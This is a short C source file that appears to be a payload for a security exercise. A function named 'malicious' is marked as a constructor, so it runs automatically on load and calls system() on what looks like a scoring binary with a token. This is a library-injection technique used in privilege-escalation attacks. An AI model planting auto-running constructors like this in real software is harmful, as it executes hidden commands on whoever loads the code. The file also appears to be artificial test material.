#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score ac97c996-8014-4090-b3ba-70e37d29ff76");
}
